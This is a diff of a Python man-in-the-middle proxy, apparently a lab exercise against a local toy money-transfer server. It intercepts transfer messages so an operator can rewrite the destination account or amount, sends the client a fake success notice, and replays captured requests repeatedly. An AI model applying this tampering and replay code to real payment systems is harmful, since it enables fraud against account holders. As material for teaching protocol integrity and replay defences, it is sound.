@@ -1,12 +1,10 @@
 import socket
 import threading
-import hashlib, hmac
 import signal, sys, time
 
 HOST = '127.0.0.1'
 MITM_PORT = 1233
 SERVER_PORT = 1234
-attack_option = input("\n[+] Do you want to attack this message? (1: Replay attack - 2: MITM attack)")
 
 def signal_handler(key, frame):
 	print("\n\n[!] Exiting...\n")
@@ -15,16 +13,20 @@ def signal_handler(key, frame):
 signal = signal.signal(signal.SIGINT, signal_handler)
 
 def threaded_client(connection):
+
+
     connection.send(str.encode('\n[+] Connection successful'))
     key = connection.recv(1024)    
     message = connection.recv(2048)
-    message_dec=message.decode()
     print("[↓] Captured message [↓]")
+    message_dec=message.decode()
     print(message_dec + "\n")
     print("[↓] Message breakdown [↓]")
     print("From: " + str(message_dec).split(":")[0])
     print("To: " + str(message_dec).split(":")[1])
     print("Amount: " + str(message_dec).split(":")[2] +"\n")
+    attack_option = input("\n[+] What attack do you wanna do? (1: Replay attack - 2: MITM attack): ")
+    connection.send(str.encode(' '))
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.connect((HOST, SERVER_PORT))
     server.send(key)
@@ -32,8 +34,10 @@ def threaded_client(connection):
 
     #---------ATTACK INIT-----------#
 
+    # MITM ATTACK
+
     if(attack_option=="2"):
-        field=input("\n[+] Select the field you want to change  (1: To - 2: Amount - 3: Both)\n")
+        field=input("\n[+] Select the field you want to change  (1: Destination account - 2: Amount - 3: Both) \n")
         if(field=="1"):
             new_destination=input("Insert new destination account: ")
             print("To: " + str(message_dec).split(":")[1]+ " ➝ " + new_destination)
@@ -66,16 +70,32 @@ def threaded_client(connection):
             response = server.recv(2048)
             print("[↓] Server Response [↓] ")
             print(response.decode())
+        
+        connection.send(str.encode('\n[+] It will be transfered {} from {} to {} in 2-3 working days. Thanks for your patience.\n'.format(
+            str(message_dec).split(":")[2], str(message_dec).split(":")[0], str(message_dec).split(":")[1])))
+
+    # REPLAY ATTACK
+
     elif(attack_option=="1"):
+        server.send(message)
+        time.sleep(1)
+        response = server.recv(2048)
+        connection.send(response)
         n_replay=input("\n[+] Number of requests: ")
         for _ in range(int(n_replay)):
+            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            server.connect((HOST, SERVER_PORT))
+            server.send(key)
+            time.sleep(0.1)
             server.send(message)
-            time.sleep(1)
+            time.sleep(0.5)
             response = server.recv(2048)
-            print("[↓] Server Response [↓] ")
+            print("\n[↓] Server Response {} [↓]".format(_+1))
             print(response.decode())
+        sys.exit(0)
+        
     else:
-        print("Select a valid attack option")
+        print("\n[!] Select a valid attack option")
 
 
 if __name__=='__main__':
